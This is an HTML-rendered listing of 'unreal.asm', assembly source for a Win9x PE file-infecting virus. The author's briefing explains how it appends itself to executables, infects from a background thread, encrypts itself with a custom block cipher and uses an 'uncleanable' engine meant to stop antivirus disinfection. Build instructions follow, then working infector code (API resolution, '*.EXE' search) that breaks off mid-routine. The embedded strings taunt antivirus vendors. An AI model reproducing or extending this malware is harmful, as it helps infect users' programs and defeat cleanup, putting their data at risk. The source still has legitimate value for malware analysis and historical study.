<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>unreal.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; Comment %</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´       UNREAL       ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;                              ÀÄÄÄÄ´ By Qozah ÃÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄ´ Briefing ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Unreal is a 3349 bytes long PE infector. It works on win9x systems by</span><span class="sc0">
</span><span class="sc1">;   appending it's code to the last file section and modifying the header to</span><span class="sc0">
</span><span class="sc1">;   do so - the so called 29A technique.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   It uses multithreading to perform it's infection; as it should waste time</span><span class="sc0">
</span><span class="sc1">;   that could be noticed by the user, launches it's routines as a thread and</span><span class="sc0">
</span><span class="sc1">;   jumps in the main thread to the legit code. Of course, it's possible</span><span class="sc0">
</span><span class="sc1">;   that the main thread is closed before the program is, but even if the</span><span class="sc0">
</span><span class="sc1">;   virus was infecting at that time nothing would happen; as it uses file</span><span class="sc0">
</span><span class="sc1">;   mapping, changes will be saved only when all is finished. Anyway I've</span><span class="sc0">
</span><span class="sc1">;   heard this idea was used before, but I also thought it didn't I ? :P</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Unreal is encrypted by QBCE ( Qozah's Block Cyphering Engine ), which</span><span class="sc0">
</span><span class="sc1">;   is a block cypher deeply analyzed forward. In a few words, it</span><span class="sc0">
</span><span class="sc1">;   makes 24 rounds of encryption with random operations on the code, making</span><span class="sc0">
</span><span class="sc1">;   it a good algorithm for crypting.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Now, maybe the best idea inside this one is that it's virtually</span><span class="sc0">
</span><span class="sc1">;   uncleanable by normal methods, due to an engine I called UVE. I strongly</span><span class="sc0">
</span><span class="sc1">;   recommend at least understanding the idea on it. Past is gone, we can't</span><span class="sc0">
</span><span class="sc1">;   relay on it making the same things. Technology has to strenghten, and new</span><span class="sc0">
</span><span class="sc1">;   ideas to fuck up antivirus's work should be taken as a standard. This is</span><span class="sc0">
</span><span class="sc1">;   a good example.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Descriptions on QBCE and UVE follow.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄ´ Qozah's Block Cyphering Engine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;    Basic operations</span><span class="sc0">
</span><span class="sc1">;    ~~~~~~~~~~~~~~~~</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   The engine selects randomly a bunch of 24 rounds which will work in all</span><span class="sc0">
</span><span class="sc1">;   the bytes of the encrypted file ( this value can be changed )</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   That values are 10 bits long, and look this way:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;            ÚÄÂÄÂÄÂÄÂÄÂÄÂÄÂÄÂÄÂÄ¿</span><span class="sc0">
</span><span class="sc1">;            ³ ³ ³ ³ ³ ³ ³ ³ ³ ³ ³</span><span class="sc0">
</span><span class="sc1">;            ÀÄÁÄÁÄÁÄÁÄÁÄÁÄÁÄÁÄÁÄÙ</span><span class="sc0">
</span><span class="sc1">;             ^   ^</span><span class="sc0">
</span><span class="sc1">;             ³   ³</span><span class="sc0">
</span><span class="sc1">;          Select ³</span><span class="sc0">
</span><span class="sc1">;                 ³</span><span class="sc0">
</span><span class="sc1">;               Argument</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   The cipher works with three basic operations: ADD, SUB, XOR, ROR and ROL.</span><span class="sc0">
</span><span class="sc1">;   So, the meanings of Select are:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;    00      ADD</span><span class="sc0">
</span><span class="sc1">;    01      SUB</span><span class="sc0">
</span><span class="sc1">;    10      XOR</span><span class="sc0">
</span><span class="sc1">;    11      ROR/ROL</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   When there is a ROR or a ROL the cipher looks at the next bit; a 0 means</span><span class="sc0">
</span><span class="sc1">;   ROR, and a 1 means ROL. These operations are obviously the ones to decrypt</span><span class="sc0">
</span><span class="sc1">;   the code, as the encryption will set them up. The value stored in the</span><span class="sc0">
</span><span class="sc1">;   Argument part which is 8 bits long except in ROL and ROR where it's just</span><span class="sc0">
</span><span class="sc1">;   7 bits: nothing to fear, as it won't be very interesting to make a more</span><span class="sc0">
</span><span class="sc1">;   than 31 times rotation.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   The table where this is stored is 31 bytes long, which is enough to</span><span class="sc0">
</span><span class="sc1">;   perform 24 operations ( 24*10 = 240 bits, 240/8 = 30 bytes ). The other</span><span class="sc0">
</span><span class="sc1">;   byte is used when messing up two 32 bit blocks.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;    Block ciphering</span><span class="sc0">
</span><span class="sc1">;    ~~~~~~~~~~~~~~~</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   The engine doesn't just crypt the code with that bunch of operations.</span><span class="sc0">
</span><span class="sc1">;   Looking at the complete length ( which is stored in 16 bits with a maximum</span><span class="sc0">
</span><span class="sc1">;   of 64Kb - keep an eye if you want to make it take bigger stuff ), it</span><span class="sc0">
</span><span class="sc1">;   divides the code in 64-bit blocks this way:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;    ÚÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;    ³         ³         ³         ³     ³</span><span class="sc0">
</span><span class="sc1">;    ÀÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;      64-bits   64-bits   64-bits  Last block ( undefined )</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   It will start cyphering 32-bit bunchs on each block, then operating</span><span class="sc0">
</span><span class="sc1">;   among any of the 2 bunchs of each block, and finally modifying the</span><span class="sc0">
</span><span class="sc1">;   last block. When the engine starts working, it divides the 64 bit block</span><span class="sc0">
</span><span class="sc1">;   in two dwords ( 32-bit each ). Loads the first of them and makes 24</span><span class="sc0">
</span><span class="sc1">;   operations byte to byte, going later with the other block:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;    Cyphering 32 bits</span><span class="sc0">
</span><span class="sc1">;    ~~~~~~~~~~~~~~~~~</span><span class="sc0">
</span><span class="sc1">;   Let's suppose the dword is in EAX:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   The first byte ( in xL ) is encrypted with the first operation, then</span><span class="sc0">
</span><span class="sc1">;   it's value is stored, the 32-bit register for it rotated right 8 bits,</span><span class="sc0">
</span><span class="sc1">;   and the same operation that was applied to it is made to the next byte;</span><span class="sc0">
</span><span class="sc1">;   the argument will be the encrypted byte. So the rotated byte in xL is</span><span class="sc0">
</span><span class="sc1">;   processed the same way:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   In this example, the first operation will be "ADD AL,4Ch", and the</span><span class="sc0">
</span><span class="sc1">;   second will be "ROR AL,5h"</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;        Original state                              First operation</span><span class="sc0">
</span><span class="sc1">;                                                                 +4C</span><span class="sc0">
</span><span class="sc1">;    ÚÄÄÄÄÂÄÄÄÄÂÄÄÄÄÂÄÄÄÄ¿                        ÚÄÄÄÄÂÄÄÄÄÂÄÄÄÄÂÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;    ³ 1A ³ F0 ³ D1 ³ 43 ³                        ³ 1A ³ F0 ³ D1 ³ 8F ³</span><span class="sc0">
</span><span class="sc1">;    ÀÄÄÄÄÁÄÄÄÄÁÄÄÄÄÁÄÄÄÄÙ                        ÀÄÄÄÄÁÄÄÄÄÁÄÄÄÄÁÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  ROL EAX,8d ( to work with next byte )             Second operation</span><span class="sc0">
</span><span class="sc1">;                                                                 ROR 5h</span><span class="sc0">
</span><span class="sc1">;    ÚÄÄÄÄÂÄÄÄÄÂÄÄÄÄÂÄÄÄÄ¿                        ÚÄÄÄÄÂÄÄÄÄÂÄÄÄÄÂÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;    ³ 8F ³ 1A ³ F0 ³ D1 ³                        ³ 8F ³ 1A ³ F0 ³ D1 ³</span><span class="sc0">
</span><span class="sc1">;    ÀÄÄÄÄÁÄÄÄÄÁÄÄÄÄÁÄÄÄÄÙ                        ÀÄÄÄÄÁÄÄÄÄÁÄÄÄÄÁÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Then, it will make that second operation to the byte "1Ah" and so on,</span><span class="sc0">
</span><span class="sc1">;   in it's 24 rounds, using of course 24 different operations ( so each</span><span class="sc0">
</span><span class="sc1">;   byte is changed 24/4*2 = 12 times )</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   When two 32-bit bunchs are finished, they will be stored: for</span><span class="sc0">
</span><span class="sc1">;   decryption, the engine works backwards: first AL is operated, then</span><span class="sc0">
</span><span class="sc1">;   rotated left and operated again with the same op, the next one is</span><span class="sc0">
</span><span class="sc1">;   done to the same AL, and so on.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Block messing</span><span class="sc0">
</span><span class="sc1">;   ~~~~~~~~~~~~~</span><span class="sc0">
</span><span class="sc1">;   When two 32 bit blocks are done, the first one is re-encrypted by the</span><span class="sc0">
</span><span class="sc1">;   second using up to four operations stored in a single byte that can be</span><span class="sc0">
</span><span class="sc1">;   either ADD or XOR in different ways, taking the other block as argument.</span><span class="sc0">
</span><span class="sc1">;   That byte is stored this way:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;    00      ADD ( the other block )</span><span class="sc0">
</span><span class="sc1">;    01      ADD ( rotating the other block )</span><span class="sc0">
</span><span class="sc1">;    10      XOR ( with the other block )</span><span class="sc0">
</span><span class="sc1">;    11      XOR ( with the other block rotated )</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   So you can see the first bit tells us if we should rotate or not the</span><span class="sc0">
</span><span class="sc1">;   block: when decrypting, this will be the first to execute instead</span><span class="sc0">
</span><span class="sc1">;   of the bunch-cyphering doing first the rotation op ( which is done the</span><span class="sc0">
</span><span class="sc1">;   last when encrypting )</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Last block</span><span class="sc0">
</span><span class="sc1">;   ~~~~~~~~~~</span><span class="sc0">
</span><span class="sc1">;   As you should have noticed, the last block won't probably be 64-bit</span><span class="sc0">
</span><span class="sc1">;   long. So, this unfixed length block is handled in a different way. If we</span><span class="sc0">
</span><span class="sc1">;   can take 32 bits from it, they will be done as a normal 32-bit block as</span><span class="sc0">
</span><span class="sc1">;   before.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   The other block won't be even touched: it's highly recommended not to</span><span class="sc0">
</span><span class="sc1">;   place anything important there or anything we should be recognized for:</span><span class="sc0">
</span><span class="sc1">;   it's not any big waste, as the bigger number of bytes that can be</span><span class="sc0">
</span><span class="sc1">;   outside blocks and non-encrypted is 3.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   So, place three fake bytes in the end of the encrypted code, and even</span><span class="sc0">
</span><span class="sc1">;   fill 'em with shit: the engine will ignore them.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄ´ Uncleanable Virus Engine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   The UVE is an idea performed after making my article about polymorphism,</span><span class="sc0">
</span><span class="sc1">;   and how it can always be detectable. Thinking on alphabets and languages,</span><span class="sc0">
</span><span class="sc1">;   a poly engine cannot be undetected, but a file infected by a virus can be</span><span class="sc0">
</span><span class="sc1">;   made uncleanable.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   That's the idea behind this engine, making it impossible to remove the</span><span class="sc0">
</span><span class="sc1">;   virus from a file, at least by a normal procedure. You could make this</span><span class="sc0">
</span><span class="sc1">;   idea bigger supporting many instructions, but that's not my point. Be it</span><span class="sc0">
</span><span class="sc1">;   one instruction as in my engine, or X instructions, the important</span><span class="sc0">
</span><span class="sc1">;   objective is accomplished. I've received some complaints because most</span><span class="sc0">
</span><span class="sc1">;   files didn't begin by mov reg,imm32. But the main objective on uncleanable</span><span class="sc0">
</span><span class="sc1">;   making is made: confussion, and not knowing if the instruction was or</span><span class="sc0">
</span><span class="sc1">;   wasn't in the beggining of the file.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   I'll describe it in 5 points:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   ş First of all, check if the first instruction of the legit code, the one</span><span class="sc0">
</span><span class="sc1">;   on the entry point, is a mov reg,imm32.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   ş In the beggining of the virus code, place that mov reg,imm32 if it</span><span class="sc0">
</span><span class="sc1">;   exists, and another 6 mov reg,imm32 instructions which use random</span><span class="sc0">
</span><span class="sc1">;   registers and random value assignations - not using esp or the one the</span><span class="sc0">
</span><span class="sc1">;   legit instruction uses.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   ş If there's no mov reg,imm32 instruction in the beggining of the legit</span><span class="sc0">
</span><span class="sc1">;   code, the engine will anyway generate 7 random mov reg,imm32 instructions</span><span class="sc0">
</span><span class="sc1">;   at the beggining of the virus.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   ş The legit code instruction 'mov reg,imm32' is overwritten with 0s, and</span><span class="sc0">
</span><span class="sc1">;   the old entry point is added 5.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   ş When the .exe is run, these 7 instructions are executed, then registers</span><span class="sc0">
</span><span class="sc1">;   are pushed onto the stack, and when returning to original host, they're</span><span class="sc0">
</span><span class="sc1">;   replaced. So, an antivirus can't know if there was a 'mov reg,imm32' in</span><span class="sc0">
</span><span class="sc1">;   the beggining of the original host code, or which one was it, so it</span><span class="sc0">
</span><span class="sc1">;   can't replace it.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄ´ Greetings ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Special greetings in this virus go to:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Billy Belcebu -&gt; For the idea on getting the Kernel32.DLL address: kewl.</span><span class="sc0">
</span><span class="sc1">;  And thanks for letting me publish in your magazine.</span><span class="sc0">
</span><span class="sc1">;   Sopinky -&gt; For all yer support man</span><span class="sc0">
</span><span class="sc1">;   Z0mbie -&gt; Cool ideas, how do u have tha time ? Ya rule, thanx for help</span><span class="sc0">
</span><span class="sc1">;   Benny -&gt; Need to hear from yer projects</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄ´ Contact ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   E-mail me at qozah@hax0r.com.ar</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄ´ Compilation ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   tasm32 -ml -m5 -q -zn unreal.asm</span><span class="sc0">
</span><span class="sc1">;   tlink32 -v -Tpe -c -x -aa unreal,,, import32</span><span class="sc0">
</span><span class="sc1">;   pewrsec unreal.exe</span><span class="sc0">
</span><span class="sc1">;   remove unreal.exe after the first infection when executing files in the</span><span class="sc0">
</span><span class="sc1">; same directory (tasm bug makes own infection a fuckup)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; %</span><span class="sc0">

</span><span class="sc2">.486p</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0">  </span><span class="sc10">flat</span><span class="sc0">

</span><span class="sc5">NULL</span><span class="sc0">                            </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">MB_ICONEXCLAMATION</span><span class="sc0">              </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000030h</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">GetModuleHandleA</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">GetProcAddress</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">


</span><span class="sc9">.data</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc5">v_start</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">Start</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">35d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">; Place set for 7 instructions.</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Get_Delta</span><span class="sc0">       </span><span class="sc1">; Get Delta Offset</span><span class="sc0">
</span><span class="sc5">Get_Delta</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc5">Real_start</span><span class="sc4">-</span><span class="sc5">Get_Delta</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Real_start</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Find_Win32_Data</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dif_point2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dif_point</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">external_first_gen_ops</span><span class="sc0">

</span><span class="sc5">external_address</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">EncStart</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">


</span><span class="sc1">; Other Data</span><span class="sc0">

</span><span class="sc5">number_bytes</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Search_File</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'*.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetMHandle</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Azathoth</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Unreal virus written by Qozah'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'So how are you going to clean this one, AV guys ?'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'It''s your turn, to tell the people that buy your '</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'shit that you cannot disinfect this one without '</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'risking their data '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;   API adresses</span><span class="sc0">

</span><span class="sc5">API_Adresses</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">API_Create</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">API_Close</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">API_FindFirst</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">API_FindNext</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">API_CMap</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">API_MapView</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">API_Unmap</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">API_Pointer</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">API_SetEnd</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">API_ExitThread</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">API_CrThread</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">API_GetWDir</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">API_SetDir</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">API_GetTime</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">Real_start</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;   Get all the APIs we'll need in the virus</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">API_Reference</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Initialize</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">API_Names</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">API_Adresses</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">API_Quantity</span><span class="sc0">
</span><span class="sc5">Get_APIs</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
